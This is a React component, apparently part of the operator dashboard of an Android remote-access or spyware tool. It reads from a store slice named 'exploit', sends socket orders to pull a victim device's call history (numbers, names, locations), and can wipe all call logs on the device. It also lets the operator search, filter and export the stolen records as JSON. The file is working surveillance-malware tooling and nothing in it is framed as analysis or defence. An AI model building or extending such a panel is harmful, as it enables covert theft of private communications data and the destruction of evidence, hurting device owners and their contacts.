import { useMemo, useState } from 'react'
import { Button } from '@/components/ui/button'
import { Phone, PhoneIncoming, PhoneOutgoing, PhoneMissed, PhoneOff, RefreshCw, Search, Trash2, Download } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

export function CallLogsTab({ clientId }: { clientId: string }) {
  const callLogs = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.callLogs ?? [],
  )
  const stats = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.callLogsStats ?? null,
  )

  const [query, setQuery] = useState('')
  const [filter, setFilter] = useState<'all' | 'incoming' | 'outgoing' | 'missed'>('all')

  const filtered = useMemo(() => {
    let list = callLogs

    if (filter !== 'all') {
      const typeMap = { incoming: 1, outgoing: 2, missed: 3 }
      list = list.filter((c: any) => c.type === typeMap[filter])
    }

    if (query) {
      const q = query.toLowerCase()
      list = list.filter((c: any) =>
        (c.number || '').toLowerCase().includes(q) ||
        (c.name || '').toLowerCase().includes(q) ||
        (c.location || '').toLowerCase().includes(q),
      )
    }

    return list
  }, [callLogs, filter, query])

  const handleRefresh = () => {
    emitOrder(clientId, 'call_logs')
  }

  const handleClear = () => {
    if (confirm('Delete all call logs on the device?')) {
      emitOrder(clientId, 'call_logs_clear')
    }
  }

  const handleDownload = () => {
    const blob = new Blob([JSON.stringify(callLogs, null, 2)], 
      { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `call_logs_${clientId}_${Date.now()}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  const getTypeIcon = (type: number) => {
    switch (type) {
      case 1: return <PhoneIncoming className="h-4 w-4 text-green-400" />
      case 2: return <PhoneOutgoing className="h-4 w-4 text-blue-400" />
      case 3: return <PhoneMissed className="h-4 w-4 text-rose-400" />
      case 5: return <PhoneOff className="h-4 w-4 text-orange-400" />
      default: return <Phone className="h-4 w-4 text-zinc-400" />
    }
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Phone className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            Call Logs
          </h3>
        </div>
        <span className="text-xs text-zinc-500">
          {callLogs.length} entries
        </span>
      </div>

      <p className="text-xs text-zinc-500">
        Reads call history from the device. Includes incoming, outgoing, missed, and rejected calls.
      </p>

      {/* Stats */}
      {stats && (
        <div className="grid grid-cols-4 gap-2">
          <div className="rounded-lg border border-white/10 bg-zinc-900/40 p-3">
            <div className="text-[10px] uppercase text-zinc-500">Total</div>
            <div className="text-lg font-semibold text-emerald-300">{stats.total}</div>
          </div>
          <div className="rounded-lg border border-white/10 bg-zinc-900/40 p-3">
            <div className="text-[10px] uppercase text-zinc-500">Incoming</div>
            <div className="text-lg font-semibold text-green-400">{stats.incoming}</div>
          </div>
          <div className="rounded-lg border border-white/10 bg-zinc-900/40 p-3">
            <div className="text-[10px] uppercase text-zinc-500">Outgoing</div>
            <div className="text-lg font-semibold text-blue-400">{stats.outgoing}</div>
          </div>
          <div className="rounded-lg border border-white/10 bg-zinc-900/40 p-3">
            <div className="text-[10px] uppercase text-zinc-500">Missed</div>
            <div className="text-lg font-semibold text-rose-400">{stats.missed}</div>
          </div>
        </div>
      )}

      {/* Search + Actions */}
      <div className="flex gap-2 flex-wrap">
        <div className="relative flex-1 min-w-[200px]">
          <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-zinc-500" />
          <input
            type="text"
            placeholder="Search number, name, location..."
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            className="w-full rounded-md bg-zinc-900 pl-8 pr-3 py-1.5 text-xs text-zinc-100 placeholder:text-zinc-600 border border-white/10 focus:border-emerald-500/50 focus:outline-none"
          />
        </div>

        <Button
          size="sm"
          onClick={handleRefresh}
          className="bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Load
        </Button>

        <Button
          size="sm"
          onClick={handleDownload}
          disabled={callLogs.length === 0}
          variant="outline"
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <Download className="h-3.5 w-3.5" /> JSON
        </Button>

        <Button
          size="sm"
          onClick={handleClear}
          variant="outline"
          className="bg-transparent border-rose-500/30 text-rose-300 hover:bg-rose-500/10"
        >
          <Trash2 className="h-3.5 w-3.5" />
        </Button>
      </div>

      {/* Filters */}
      <div className="flex gap-2 text-xs">
        {(['all', 'incoming', 'outgoing', 'missed'] as const).map((f) => (
          <button
            key={f}
            onClick={() => setFilter(f)}
            className={`px-2 py-1 rounded capitalize ${
              filter === f
                ? 'bg-emerald-500/20 text-emerald-200 ring-1 ring-emerald-500/40'
                : 'bg-zinc-900 text-zinc-400 ring-1 ring-white/10 hover:bg-zinc-800'
            }`}
          >
            {f}
          </button>
        ))}
      </div>

      {/* List */}
      <div className="rounded-xl border border-white/10 bg-zinc-900/40 max-h-[55vh] overflow-y-auto scrollbar-emerald">
        {filtered.length === 0 ? (
          <div className="py-8 text-center text-xs text-zinc-600">
            {callLogs.length === 0
              ? 'No call logs loaded. Click "Load" to fetch.'
              : 'No match for filters'}
          </div>
        ) : (
          <div className="divide-y divide-white/5">
            {filtered.map((call: any, i: number) => (
              <div
                key={i}
                className="flex items-center gap-3 px-3 py-2 hover:bg-white/[0.03]"
              >
                <span className="shrink-0">{getTypeIcon(call.type)}</span>

                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-semibold text-zinc-200 truncate">
                      {call.name || call.number || 'Unknown'}
                    </span>
                    {call.name && call.number && (
                      <span className="text-[10px] font-mono text-zinc-500 truncate">
                        {call.number}
                      </span>
                    )}
                  </div>
                  <div className="flex items-center gap-2 text-[10px] text-zinc-500">
                    <span>{call.dateStr}</span>
                    {call.duration > 0 && (
                      <>
                        <span>·</span>
                        <span>{call.durationStr}</span>
                      </>
                    )}
                    {call.location && (
                      <>
                        <span>·</span>
                        <span className="text-blue-400/70">{call.location}</span>
                      </>
                    )}
                  </div>
                </div>

                <span className={`text-[10px] px-2 py-0.5 rounded ${
                  call.type === 1 ? 'bg-green-500/10 text-green-300' :
                  call.type === 2 ? 'bg-blue-500/10 text-blue-300' :
                  call.type === 3 ? 'bg-rose-500/10 text-rose-300' :
                  'bg-zinc-500/10 text-zinc-400'
                }`}>
                  {call.typeName || 'Unknown'}
                </span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
